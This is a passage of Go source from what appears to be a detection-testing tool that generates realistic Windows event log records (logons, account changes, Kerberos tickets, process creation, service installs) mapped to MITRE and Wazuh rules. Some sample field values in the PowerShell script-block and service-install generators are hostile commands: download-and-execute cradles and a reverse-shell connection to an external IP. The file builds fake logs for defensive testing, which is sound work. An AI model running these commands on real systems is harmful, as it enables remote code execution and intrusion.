package catalog

import (
	"fmt"
	"strings"

	"socbyte.ai/logsource/internal/core"
)

// Windows event log controls. Each one reproduces the real description text and
// the event data fields that detection rules key off, so a rule that matches
// here matches a genuine agent record too.

// securityGUID identifies the Security auditing provider.
const securityGUID = "{54849625-5478-4994-a5ba-3e3b0328c30d}"

// lines joins description blocks with the CRLF that Windows uses.
func lines(parts ...string) string { return strings.Join(parts, "\r\n") }

// kv renders one indented "Label: value" row of an event description.
func kv(label, value string) string { return "\t" + label + ":\t" + value }

// secEvent pre-fills the fields every Security channel record shares.
func secEvent(c *core.Ctx, id, task, taskName, audit string, criticality int) *core.WinEvent {
	kw := "0x8020000000000000" // audit success
	if audit == core.AuditFailure {
		kw = "0x8010000000000000"
	}
	return &core.WinEvent{
		EventID:      id,
		Channel:      "Security",
		Provider:     "Microsoft-Windows-Security-Auditing",
		ProviderGUID: securityGUID,
		Task:         task,
		TaskName:     taskName,
		AuditType:    audit,
		Keywords:     kw,
		Computer:     c.WinFQDN(),
		Criticality:  criticality,
		RecordID:     c.Int(100000, 999999),
		ProcessID:    c.Int(500, 900),
		ThreadID:     c.Int(1000, 9000),
		EventData:    map[string]string{},
	}
}

// winPayload wraps a rendered event for the sender.
func winPayload(c *core.Ctx, e *core.WinEvent, severity int) core.Payload {
	return core.Payload{
		Kind:     core.SourceWindows,
		Host:     c.Env.WinHost,
		Facility: core.FacLocal0,
		Severity: severity,
		Win:      e,
	}
}

// subject renders the "Subject:" block that names the account performing the
// action, present on nearly every Security event.
func subject(c *core.Ctx, user, logonID string) string {
	return lines(
		"Subject:",
		kv("Security ID", c.UserSID(user)),
		kv("Account Name", user),
		kv("Account Domain", c.Env.NetBIOS),
		kv("Logon ID", logonID),
	)
}

// logonTypeName maps a Windows logon type to its meaning.
func logonTypeName(t string) string {
	switch t {
	case "2":
		return "Interactive"
	case "3":
		return "Network"
	case "4":
		return "Batch"
	case "5":
		return "Service"
	case "7":
		return "Unlock"
	case "8":
		return "NetworkCleartext"
	case "9":
		return "NewCredentials"
	case "10":
		return "RemoteInteractive"
	case "11":
		return "CachedInteractive"
	default:
		return "Unknown"
	}
}

// param is a small constructor to keep the registrations readable.
func param(key, label, placeholder string) core.Param {
	return core.Param{Key: key, Label: label, Placeholder: placeholder}
}

var (
	pUser  = param("user", "Target account", "auto")
	pActor = param("actor", "Acting account", "auto")
	pSrcIP = param("srcip", "Source IP", "auto")
	pHost  = param("workstation", "Workstation", "auto")
)

func init() {
	registerWindowsAuth()
	registerWindowsAccounts()
	registerWindowsKerberos()
	registerWindowsExecution()
	registerWindowsDefenseEvasion()
	registerWindowsLateral()
}

// ---------------------------------------------------------------------------
// Authentication
// ---------------------------------------------------------------------------

func registerWindowsAuth() {
	Register(core.Definition{
		Control: core.Control{
			ID: "win-4624-logon-success", Source: core.SourceWindows,
			Group: "Authentication", Name: "Successful logon",
			Desc:     "An account was successfully logged on. Logon type distinguishes console, network and RDP sessions.",
			EventID:  "4624", Channel: "Security", Severity: core.SevLabelInfo,
			Mitre: []string{"T1078"}, Wazuh: []string{"60106"},
			Params: []core.Param{pUser, pSrcIP, pHost,
				param("logontype", "Logon type", "2, 3, 10 …")},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.User())
			lt := c.P("logontype", c.Pick("2", "3", "10"))
			srcIP := c.P("srcip", c.InternalIP())
			ws := c.P("workstation", c.Workstation())
			logonID := c.LogonID()
			pkg, proc := "NTLM", "NtLmSsp"
			if lt == "2" {
				pkg, proc = "Negotiate", "User32"
			}

			e := secEvent(c, "4624", "12544", "Logon", core.AuditSuccess, 1)
			e.User = c.Env.NetBIOS + `\` + user
			e.Message = lines(
				"An account was successfully logged on.", "",
				"Subject:",
				kv("Security ID", "S-1-5-18"),
				kv("Account Name", strings.ToUpper(c.Env.WinHost)+"$"),
				kv("Account Domain", c.Env.NetBIOS),
				kv("Logon ID", "0x3E7"), "",
				"Logon Information:",
				kv("Logon Type", lt),
				kv("Restricted Admin Mode", "-"),
				kv("Virtual Account", "No"),
				kv("Elevated Token", "No"), "",
				"New Logon:",
				kv("Security ID", c.UserSID(user)),
				kv("Account Name", user),
				kv("Account Domain", c.Env.NetBIOS),
				kv("Logon ID", logonID),
				kv("Logon GUID", c.GUID()), "",
				"Network Information:",
				kv("Workstation Name", ws),
				kv("Source Network Address", srcIP),
				kv("Source Port", fmt.Sprint(c.EphemeralPort())), "",
				"Detailed Authentication Information:",
				kv("Logon Process", proc),
				kv("Authentication Package", pkg),
				kv("Key Length", "128"),
			)
			e.EventData = map[string]string{
				"targetUserName": user, "targetDomainName": c.Env.NetBIOS,
				"targetUserSid": c.UserSID(user), "targetLogonId": logonID,
				"logonType": lt, "logonProcessName": proc,
				"authenticationPackageName": pkg, "workstationName": ws,
				"ipAddress": srcIP, "status": "0x0",
			}
			return winPayload(c, e, core.SevInfo)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "win-4625-logon-failed", Source: core.SourceWindows,
			Group: "Authentication", Name: "Failed logon",
			Desc:     "An account failed to log on. Burst this control to simulate password spraying or brute force.",
			EventID:  "4625", Channel: "Security", Severity: core.SevLabelMedium,
			Mitre: []string{"T1110"}, Wazuh: []string{"60122"},
			Params: []core.Param{pUser, pSrcIP, pHost,
				param("reason", "Failure reason", "badpassword, nouser, disabled, lockedout, expired")},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.User())
			srcIP := c.P("srcip", c.ExternalIP())
			ws := c.P("workstation", c.Workstation())

			// Windows reports the broad failure in Status and the specific
			// cause in Sub Status; rules commonly key off the sub status.
			status, sub, reason := "0xc000006d", "0xc000006a", "Unknown user name or bad password."
			switch c.P("reason", "badpassword") {
			case "nouser":
				sub = "0xc0000064"
			case "disabled":
				status, sub, reason = "0xc0000072", "0xc0000072", "Account currently disabled."
			case "lockedout":
				status, sub, reason = "0xc0000234", "0xc0000234", "Account locked out."
			case "expired":
				status, sub, reason = "0xc0000193", "0xc0000193", "Account expired."
			}

			e := secEvent(c, "4625", "12544", "Logon", core.AuditFailure, 2)
			e.User = c.Env.NetBIOS + `\` + user
			e.Message = lines(
				"An account failed to log on.", "",
				"Subject:",
				kv("Security ID", "S-1-0-0"),
				kv("Account Name", "-"),
				kv("Account Domain", "-"),
				kv("Logon ID", "0x0"), "",
				"Logon Type:\t\t\t3", "",
				"Account For Which Logon Failed:",
				kv("Security ID", "S-1-0-0"),
				kv("Account Name", user),
				kv("Account Domain", c.Env.NetBIOS), "",
				"Failure Information:",
				kv("Failure Reason", reason),
				kv("Status", status),
				kv("Sub Status", sub), "",
				"Network Information:",
				kv("Workstation Name", ws),
				kv("Source Network Address", srcIP),
				kv("Source Port", fmt.Sprint(c.EphemeralPort())), "",
				"Detailed Authentication Information:",
				kv("Logon Process", "NtLmSsp"),
				kv("Authentication Package", "NTLM"),
			)
			e.EventData = map[string]string{
				"targetUserName": user, "targetDomainName": c.Env.NetBIOS,
				"logonType": "3", "status": status, "subStatus": sub,
				"workstationName": ws, "ipAddress": srcIP,
				"authenticationPackageName": "NTLM",
			}
			return winPayload(c, e, core.SevWarning)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "win-4634-logoff", Source: core.SourceWindows,
			Group: "Authentication", Name: "Account logged off",
			Desc:     "A logon session was closed. Useful for testing session correlation against 4624.",
			EventID:  "4634", Channel: "Security", Severity: core.SevLabelInfo,
			Wazuh:  []string{"60107"},
			Params: []core.Param{pUser},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.User())
			logonID := c.LogonID()
			e := secEvent(c, "4634", "12545", "Logoff", core.AuditSuccess, 1)
			e.User = c.Env.NetBIOS + `\` + user
			e.Message = lines(
				"An account was logged off.", "",
				"Subject:",
				kv("Security ID", c.UserSID(user)),
				kv("Account Name", user),
				kv("Account Domain", c.Env.NetBIOS),
				kv("Logon ID", logonID), "",
				"Logon Type:\t\t\t3",
			)
			e.EventData = map[string]string{
				"targetUserName": user, "targetDomainName": c.Env.NetBIOS,
				"targetLogonId": logonID, "logonType": "3",
			}
			return winPayload(c, e, core.SevInfo)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "win-4648-explicit-creds", Source: core.SourceWindows,
			Group: "Authentication", Name: "Logon with explicit credentials",
			Desc:     "An account used runas or a stored credential to authenticate as somebody else — a common lateral movement signal.",
			EventID:  "4648", Channel: "Security", Severity: core.SevLabelMedium,
			Mitre: []string{"T1078", "T1550"}, Wazuh: []string{"60110"},
			Params: []core.Param{pActor, pUser, param("target", "Target server", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			actor := c.P("actor", c.User())
			target := c.P("user", c.AdminUser())
			server := c.P("target", c.Workstation())

			e := secEvent(c, "4648", "12544", "Logon", core.AuditSuccess, 2)
			e.User = c.Env.NetBIOS + `\` + actor
			e.Message = lines(
				"A logon was attempted using explicit credentials.", "",
				subject(c, actor, c.LogonID()), "",
				"Account Whose Credentials Were Used:",
				kv("Account Name", target),
				kv("Account Domain", c.Env.NetBIOS),
				kv("Logon GUID", c.GUID()), "",
				"Target Server:",
				kv("Target Server Name", server),
				kv("Additional Information", server+"."+strings.ToLower(c.Env.Domain)), "",
				"Process Information:",
				kv("Process ID", fmt.Sprintf("0x%s", c.Hex(4))),
				kv("Process Name", `C:\Windows\System32\runas.exe`), "",
				"Network Information:",
				kv("Network Address", c.InternalIP()),
				kv("Port", fmt.Sprint(c.EphemeralPort())),
			)
			e.EventData = map[string]string{
				"subjectUserName": actor, "subjectDomainName": c.Env.NetBIOS,
				"targetUserName": target, "targetDomainName": c.Env.NetBIOS,
				"targetServerName": server, "processName": `C:\Windows\System32\runas.exe`,
				"ipAddress": c.InternalIP(),
			}
			return winPayload(c, e, core.SevNotice)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "win-4672-special-privileges", Source: core.SourceWindows,
			Group: "Authentication", Name: "Special privileges assigned",
			Desc:     "A logon was granted administrator-equivalent privileges. Paired with 4624 it marks a privileged session.",
			EventID:  "4672", Channel: "Security", Severity: core.SevLabelMedium,
			Mitre: []string{"T1078.002"}, Wazuh: []string{"60115"},
			Params: []core.Param{pUser},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.AdminUser())
			logonID := c.LogonID()
			e := secEvent(c, "4672", "12548", "Special Logon", core.AuditSuccess, 2)
			e.User = c.Env.NetBIOS + `\` + user
			e.Message = lines(
				"Special privileges assigned to new logon.", "",
				"Subject:",
				kv("Security ID", c.UserSID(user)),
				kv("Account Name", user),
				kv("Account Domain", c.Env.NetBIOS),
				kv("Logon ID", logonID), "",
				"Privileges:\t\tSeSecurityPrivilege",
				"\t\t\tSeTakeOwnershipPrivilege",
				"\t\t\tSeLoadDriverPrivilege",
				"\t\t\tSeBackupPrivilege",
				"\t\t\tSeRestorePrivilege",
				"\t\t\tSeDebugPrivilege",
				"\t\t\tSeSystemEnvironmentPrivilege",
				"\t\t\tSeImpersonatePrivilege",
			)
			e.EventData = map[string]string{
				"subjectUserName": user, "subjectDomainName": c.Env.NetBIOS,
				"subjectLogonId": logonID,
				"privilegeList":  "SeSecurityPrivilege SeTakeOwnershipPrivilege SeLoadDriverPrivilege SeBackupPrivilege SeRestorePrivilege SeDebugPrivilege SeImpersonatePrivilege",
			}
			return winPayload(c, e, core.SevNotice)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "win-4776-ntlm-validation", Source: core.SourceWindows,
			Group: "Authentication", Name: "NTLM credential validation failed",
			Desc:     "The domain controller failed to validate an NTLM credential. Error 0xC0000064 means the account does not exist.",
			EventID:  "4776", Channel: "Security", Severity: core.SevLabelMedium,
			Mitre: []string{"T1110"}, Wazuh: []string{"60133"},
			Params: []core.Param{pUser, pHost},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.User())
			ws := c.P("workstation", c.Workstation())
			e := secEvent(c, "4776", "14336", "Credential Validation", core.AuditFailure, 2)
			e.User = "N/A"
			e.Message = lines(
				"The computer attempted to validate the credentials for an account.", "",
				kv("Authentication Package", "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0"),
				kv("Logon Account", user),
				kv("Source Workstation", ws),
				kv("Error Code", "0xC000006A"),
			)
			e.EventData = map[string]string{
				"packageName": "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0",
				"targetUserName": user, "workstation": ws, "status": "0xc000006a",
			}
			return winPayload(c, e, core.SevWarning)
		},
	})
}

// ---------------------------------------------------------------------------
// Account management
// ---------------------------------------------------------------------------

func registerWindowsAccounts() {
	type acct struct {
		id, task, name, desc, sev string
		mitre, wazuh              []string
		summary                   string
	}

	simple := []acct{
		{id: "4720", task: "13824", name: "User account created",
			desc:    "A new user account was created in the domain.",
			sev:     core.SevLabelMedium,
			mitre:   []string{"T1136.002"}, wazuh: []string{"60109"},
			summary: "A user account was created."},
		{id: "4722", task: "13824", name: "User account enabled",
			desc:    "A previously disabled account was enabled.",
			sev:     core.SevLabelMedium,
			mitre:   []string{"T1098"}, wazuh: []string{"60112"},
			summary: "A user account was enabled."},
		{id: "4725", task: "13824", name: "User account disabled",
			desc:    "An account was disabled.",
			sev:     core.SevLabelLow,
			mitre:   []string{"T1531"}, wazuh: []string{"60117"},
			summary: "A user account was disabled."},
		{id: "4726", task: "13824", name: "User account deleted",
			desc:    "An account was removed from the domain.",
			sev:     core.SevLabelMedium,
			mitre:   []string{"T1531"}, wazuh: []string{"60114"},
			summary: "A user account was deleted."},
		{id: "4738", task: "13824", name: "User account changed",
			desc:    "Attributes on an account were modified.",
			sev:     core.SevLabelLow,
			mitre:   []string{"T1098"}, wazuh: []string{"60116"},
			summary: "A user account was changed."},
	}

	for _, a := range simple {
		a := a // capture per iteration
		Register(core.Definition{
			Control: core.Control{
				ID: "win-" + a.id + "-" + slug(a.name), Source: core.SourceWindows,
				Group: "Account Management", Name: a.name, Desc: a.desc,
				EventID: a.id, Channel: "Security", Severity: a.sev,
				Mitre: a.mitre, Wazuh: a.wazuh,
				Params: []core.Param{pActor, pUser},
			},
			Build: func(c *core.Ctx) core.Payload {
				actor := c.P("actor", c.AdminUser())
				target := c.P("user", c.User())
				e := secEvent(c, a.id, a.task, "User Account Management", core.AuditSuccess, 2)
				e.User = c.Env.NetBIOS + `\` + actor
				e.Message = lines(
					a.summary, "",
					subject(c, actor, c.LogonID()), "",
					"Target Account:",
					kv("Security ID", c.UserSID(target)),
					kv("Account Name", target),
					kv("Account Domain", c.Env.NetBIOS),
				)
				e.EventData = map[string]string{
					"subjectUserName": actor, "subjectDomainName": c.Env.NetBIOS,
					"targetUserName": target, "targetDomainName": c.Env.NetBIOS,
					"targetSid": c.UserSID(target),
				}
				return winPayload(c, e, core.SevNotice)
			},
		})
	}

	Register(core.Definition{
		Control: core.Control{
			ID: "win-4724-password-reset", Source: core.SourceWindows,
			Group: "Account Management", Name: "Password reset attempt",
			Desc:     "An administrator reset another account's password without knowing the old one.",
			EventID:  "4724", Channel: "Security", Severity: core.SevLabelMedium,
			Mitre: []string{"T1098"}, Wazuh: []string{"60113"},
			Params: []core.Param{pActor, pUser},
		},
		Build: func(c *core.Ctx) core.Payload {
			actor := c.P("actor", c.AdminUser())
			target := c.P("user", c.User())
			e := secEvent(c, "4724", "13824", "User Account Management", core.AuditSuccess, 2)
			e.User = c.Env.NetBIOS + `\` + actor
			e.Message = lines(
				"An attempt was made to reset an account's password.", "",
				subject(c, actor, c.LogonID()), "",
				"Target Account:",
				kv("Security ID", c.UserSID(target)),
				kv("Account Name", target),
				kv("Account Domain", c.Env.NetBIOS),
			)
			e.EventData = map[string]string{
				"subjectUserName": actor, "targetUserName": target,
				"targetDomainName": c.Env.NetBIOS,
			}
			return winPayload(c, e, core.SevNotice)
		},
	})

	// Group membership additions carry the strongest privilege-escalation signal.
	for _, g := range []struct{ id, name, desc, group, task string }{
		{"4728", "Added to global security group", "An account was added to a security-enabled global group such as Domain Admins.", "Domain Admins", "13826"},
		{"4732", "Added to local security group", "An account was added to a security-enabled local group such as Administrators.", "Administrators", "13826"},
		{"4756", "Added to universal security group", "An account was added to a security-enabled universal group such as Enterprise Admins.", "Enterprise Admins", "13827"},
	} {
		g := g
		Register(core.Definition{
			Control: core.Control{
				ID: "win-" + g.id + "-group-add", Source: core.SourceWindows,
				Group: "Account Management", Name: g.name, Desc: g.desc,
				EventID: g.id, Channel: "Security", Severity: core.SevLabelHigh,
				Mitre: []string{"T1098"}, Wazuh: []string{"60118", "60119"},
				Params: []core.Param{pActor, pUser, param("group", "Group name", g.group)},
			},
			Build: func(c *core.Ctx) core.Payload {
				actor := c.P("actor", c.AdminUser())
				member := c.P("user", c.User())
				group := c.P("group", g.group)

				e := secEvent(c, g.id, g.task, "Security Group Management", core.AuditSuccess, 3)
				e.User = c.Env.NetBIOS + `\` + actor
				e.Message = lines(
					"A member was added to a security-enabled group.", "",
					subject(c, actor, c.LogonID()), "",
					"Member:",
					kv("Security ID", c.UserSID(member)),
					kv("Account Name", fmt.Sprintf("CN=%s,CN=Users,%s", member, dn(c.Env.Domain))), "",
					"Group:",
					kv("Security ID", c.UserSID(group)),
					kv("Group Name", group),
					kv("Group Domain", c.Env.NetBIOS),
				)
				e.EventData = map[string]string{
					"subjectUserName": actor, "subjectDomainName": c.Env.NetBIOS,
					"memberName": fmt.Sprintf("CN=%s,CN=Users,%s", member, dn(c.Env.Domain)),
					"memberSid":  c.UserSID(member),
					"targetUserName": group, "targetDomainName": c.Env.NetBIOS,
				}
				return winPayload(c, e, core.SevWarning)
			},
		})
	}

	Register(core.Definition{
		Control: core.Control{
			ID: "win-4740-account-lockout", Source: core.SourceWindows,
			Group: "Account Management", Name: "Account locked out",
			Desc:     "An account exceeded the bad password threshold and was locked. Often the tail end of a brute force.",
			EventID:  "4740", Channel: "Security", Severity: core.SevLabelMedium,
			Mitre: []string{"T1110"}, Wazuh: []string{"60120"},
			Params: []core.Param{pUser, pHost},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.User())
			ws := c.P("workstation", c.Workstation())
			e := secEvent(c, "4740", "13824", "User Account Management", core.AuditSuccess, 2)
			e.User = c.Env.NetBIOS + `\` + user
			e.Message = lines(
				"A user account was locked out.", "",
				"Subject:",
				kv("Security ID", "S-1-5-18"),
				kv("Account Name", strings.ToUpper(c.Env.WinHost)+"$"),
				kv("Account Domain", c.Env.NetBIOS),
				kv("Logon ID", "0x3E7"), "",
				"Account That Was Locked Out:",
				kv("Security ID", c.UserSID(user)),
				kv("Account Name", user), "",
				"Additional Information:",
				kv("Caller Computer Name", ws),
			)
			e.EventData = map[string]string{
				"targetUserName": user, "targetDomainName": c.Env.NetBIOS,
				"targetSid": c.UserSID(user), "callerComputerName": ws,
			}
			return winPayload(c, e, core.SevWarning)
		},
	})
}

// ---------------------------------------------------------------------------
// Kerberos
// ---------------------------------------------------------------------------

func registerWindowsKerberos() {
	Register(core.Definition{
		Control: core.Control{
			ID: "win-4768-tgt-request", Source: core.SourceWindows,
			Group: "Kerberos", Name: "Kerberos TGT requested",
			Desc:     "A Kerberos authentication ticket was issued. Result code 0x0 means success.",
			EventID:  "4768", Channel: "Security", Severity: core.SevLabelInfo,
			Wazuh:  []string{"60126"},
			Params: []core.Param{pUser, pSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.User())
			ip := c.P("srcip", c.InternalIP())
			e := secEvent(c, "4768", "14339", "Kerberos Authentication Service", core.AuditSuccess, 1)
			e.User = c.Env.NetBIOS + `\` + user
			e.Message = lines(
				"A Kerberos authentication ticket (TGT) was requested.", "",
				"Account Information:",
				kv("Account Name", user),
				kv("Supplied Realm Name", c.Env.NetBIOS),
				kv("User ID", c.UserSID(user)), "",
				"Service Information:",
				kv("Service Name", "krbtgt"),
				kv("Service ID", c.UserSID("krbtgt")), "",
				"Network Information:",
				kv("Client Address", "::ffff:"+ip),
				kv("Client Port", fmt.Sprint(c.EphemeralPort())), "",
				"Additional Information:",
				kv("Ticket Options", "0x40810010"),
				kv("Result Code", "0x0"),
				kv("Ticket Encryption Type", "0x12"),
			)
			e.EventData = map[string]string{
				"targetUserName": user, "targetDomainName": c.Env.NetBIOS,
				"serviceName": "krbtgt", "ipAddress": "::ffff:" + ip,
				"ticketEncryptionType": "0x12", "status": "0x0",
			}
			return winPayload(c, e, core.SevInfo)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "win-4769-kerberoast", Source: core.SourceWindows,
			Group: "Kerberos", Name: "Service ticket requested (kerberoasting)",
			Desc:     "A service ticket was requested with RC4 encryption (0x17) for a service account — the signature of kerberoasting.",
			EventID:  "4769", Channel: "Security", Severity: core.SevLabelHigh,
			Mitre: []string{"T1558.003"}, Wazuh: []string{"60127"},
			Params: []core.Param{pUser, pSrcIP,
				param("service", "Service name", "auto"),
				param("enctype", "Encryption type", "0x17")},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.User())
			svc := c.P("service", c.ServiceUser())
			ip := c.P("srcip", c.InternalIP())
			enc := c.P("enctype", "0x17")

			e := secEvent(c, "4769", "14337", "Kerberos Service Ticket Operations", core.AuditSuccess, 3)
			e.User = c.Env.NetBIOS + `\` + user
			e.Message = lines(
				"A Kerberos service ticket was requested.", "",
				"Account Information:",
				kv("Account Name", c.UPN(user)),
				kv("Account Domain", strings.ToLower(c.Env.Domain)),
				kv("Logon GUID", c.GUID()), "",
				"Service Information:",
				kv("Service Name", svc),
				kv("Service ID", c.UserSID(svc)), "",
				"Network Information:",
				kv("Client Address", "::ffff:"+ip),
				kv("Client Port", fmt.Sprint(c.EphemeralPort())), "",
				"Additional Information:",
				kv("Ticket Options", "0x40810000"),
				kv("Ticket Encryption Type", enc),
				kv("Failure Code", "0x0"),
			)
			e.EventData = map[string]string{
				"targetUserName": c.UPN(user), "targetDomainName": strings.ToLower(c.Env.Domain),
				"serviceName": svc, "serviceSid": c.UserSID(svc),
				"ipAddress": "::ffff:" + ip, "ticketEncryptionType": enc,
				"ticketOptions": "0x40810000", "status": "0x0",
			}
			return winPayload(c, e, core.SevWarning)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "win-4771-preauth-failed", Source: core.SourceWindows,
			Group: "Kerberos", Name: "Kerberos pre-authentication failed",
			Desc:     "Failure code 0x18 means a bad password over Kerberos. Burst this to simulate a domain brute force.",
			EventID:  "4771", Channel: "Security", Severity: core.SevLabelMedium,
			Mitre: []string{"T1110"}, Wazuh: []string{"60128"},
			Params: []core.Param{pUser, pSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.User())
			ip := c.P("srcip", c.ExternalIP())
			e := secEvent(c, "4771", "14339", "Kerberos Authentication Service", core.AuditFailure, 2)
			e.User = c.Env.NetBIOS + `\` + user
			e.Message = lines(
				"Kerberos pre-authentication failed.", "",
				"Account Information:",
				kv("Security ID", c.UserSID(user)),
				kv("Account Name", user), "",
				"Service Information:",
				kv("Service Name", "krbtgt/"+strings.ToUpper(c.Env.Domain)), "",
				"Network Information:",
				kv("Client Address", "::ffff:"+ip),
				kv("Client Port", fmt.Sprint(c.EphemeralPort())), "",
				"Additional Information:",
				kv("Ticket Options", "0x40810010"),
				kv("Failure Code", "0x18"),
				kv("Pre-Authentication Type", "2"),
			)
			e.EventData = map[string]string{
				"targetUserName": user, "targetSid": c.UserSID(user),
				"serviceName": "krbtgt/" + strings.ToUpper(c.Env.Domain),
				"ipAddress":   "::ffff:" + ip, "status": "0x18",
			}
			return winPayload(c, e, core.SevWarning)
		},
	})
}

// ---------------------------------------------------------------------------
// Execution and persistence
// ---------------------------------------------------------------------------

func registerWindowsExecution() {
	Register(core.Definition{
		Control: core.Control{
			ID: "win-4688-process-creation", Source: core.SourceWindows,
			Group: "Execution", Name: "Process creation",
			Desc:     "A new process was created. Command line auditing must be enabled for the command line field to be populated.",
			EventID:  "4688", Channel: "Security", Severity: core.SevLabelLow,
			Mitre: []string{"T1059"}, Wazuh: []string{"61138"},
			Params: []core.Param{pUser,
				param("process", "New process path", "auto"),
				param("cmdline", "Command line", "auto"),
				param("parent", "Parent process path", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.User())
			proc := c.P("process", c.Pick(
				`C:\Windows\System32\cmd.exe`,
				`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
				`C:\Windows\System32\net.exe`,
				`C:\Windows\System32\whoami.exe`,
			))
			cmd := c.P("cmdline", defaultCmdline(proc))
			parent := c.P("parent", c.Pick(
				`C:\Windows\explorer.exe`,
				`C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE`,
				`C:\Windows\System32\services.exe`,
			))

			e := secEvent(c, "4688", "13312", "Process Creation", core.AuditSuccess, 1)
			e.User = c.Env.NetBIOS + `\` + user
			newPID := fmt.Sprintf("0x%s", c.Hex(4))
			e.Message = lines(
				"A new process has been created.", "",
				"Creator Subject:",
				kv("Security ID", c.UserSID(user)),
				kv("Account Name", user),
				kv("Account Domain", c.Env.NetBIOS),
				kv("Logon ID", c.LogonID()), "",
				"Process Information:",
				kv("New Process ID", newPID),
				kv("New Process Name", proc),
				kv("Token Elevation Type", "%%1936"),
				kv("Mandatory Label", "S-1-16-8192"),
				kv("Creator Process Name", parent),
				kv("Process Command Line", cmd),
			)
			e.EventData = map[string]string{
				"subjectUserName": user, "subjectDomainName": c.Env.NetBIOS,
				"newProcessId": newPID, "newProcessName": proc,
				"parentProcessName": parent, "commandLine": cmd,
				"tokenElevationType": "%%1936",
			}
			return winPayload(c, e, core.SevInfo)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "win-4104-powershell-scriptblock", Source: core.SourceWindows,
			Group: "Execution", Name: "PowerShell script block logging",
			Desc:     "Script block logging captured PowerShell code at execution time, after any obfuscation is resolved.",
			EventID:  "4104", Channel: "Microsoft-Windows-PowerShell/Operational",
			Severity: core.SevLabelHigh,
			Mitre:    []string{"T1059.001"}, Wazuh: []string{"91802"},
			Params: []core.Param{pUser, param("script", "Script block text", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.User())
			script := c.P("script", c.Pick(
				`IEX (New-Object Net.WebClient).DownloadString('http://`+c.ExternalIP()+`/a.ps1')`,
				`powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA`,
				`Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount=True"`,
				`$c=New-Object System.Net.Sockets.TCPClient('`+c.ExternalIP()+`',4444)`,
			))

			e := &core.WinEvent{
				EventID: "4104", Channel: "Microsoft-Windows-PowerShell/Operational",
				Provider: "Microsoft-Windows-PowerShell", ProviderGUID: "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
				Task: "2", TaskName: "Execute a Remote Command",
				AuditType: core.AuditWarning, Keywords: "0x0",
				Computer: c.WinFQDN(), User: c.Env.NetBIOS + `\` + user,
				Criticality: 3, RecordID: c.Int(10000, 99999),
				ProcessID: c.Int(500, 9000), ThreadID: c.Int(1000, 9000),
			}
			e.Message = lines(
				"Creating Scriptblock text (1 of 1):",
				script, "",
				"ScriptBlock ID: "+strings.Trim(c.GUID(), "{}"),
				"Path: ",
			)
			e.EventData = map[string]string{
				"scriptBlockText": script, "scriptBlockId": strings.Trim(c.GUID(), "{}"),
				"messageNumber": "1", "messageTotal": "1",
			}
			return winPayload(c, e, core.SevWarning)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "win-7045-service-installed", Source: core.SourceWindows,
			Group: "Persistence", Name: "Service installed (System log)",
			Desc:     "Service Control Manager registered a new service. A classic persistence and lateral movement artefact.",
			EventID:  "7045", Channel: "System", Severity: core.SevLabelHigh,
			Mitre: []string{"T1543.003"}, Wazuh: []string{"61101"},
			Params: []core.Param{
				param("service", "Service name", "auto"),
				param("path", "Service binary path", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			name := c.P("service", c.Pick("WinUpdateSvc", "SysMonitorHost", "RemoteSupportSvc", "DefenderHelper"))
			path := c.P("path", c.Pick(
				`%COMSPEC% /C powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).downloadString('http://`+c.ExternalIP()+`/s')"`,
				`C:\Windows\Temp\`+strings.ToLower(name)+`.exe`,
				`C:\ProgramData\`+name+`\svc.exe`,
			))

			e := &core.WinEvent{
				EventID: "7045", Channel: "System",
				Provider: "Service Control Manager",
				ProviderGUID: "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
				Task: "0", TaskName: "None",
				AuditType: core.AuditInfo, Keywords: "0x8080000000000000",
				Computer: c.WinFQDN(), User: "N/A",
				Criticality: 3, RecordID: c.Int(10000, 99999),
				ProcessID: c.Int(500, 900), ThreadID: c.Int(1000, 9000),
			}
			e.Message = lines(
				"A service was installed in the system.", "",
				kv("Service Name", name),
				kv("Service File Name", path),
				kv("Service Type", "user mode service"),
				kv("Service Start Type", "demand start"),
				kv("Service Account", "LocalSystem"),
			)
			e.EventData = map[string]string{
				"serviceName": name, "imagePath": path,
				"serviceType": "user mode service", "startType": "demand start",
				"accountName": "LocalSystem",
			}
			return winPayload(c, e, core.SevWarning)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "win-4697-service-installed-security", Source: core.SourceWindows,
			Group: "Persistence", Name: "Service installed (Security log)",
			Desc:     "The Security channel equivalent of 7045, available when the System Security Extension subcategory is audited.",
			EventID:  "4697", Channel: "Security", Severity: core.SevLabelHigh,
			Mitre: []string{"T1543.003"}, Wazuh: []string{"61143"},
			Params: []core.Param{pUser, param("service", "Service name", "auto"), param("path", "Binary path", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.AdminUser())
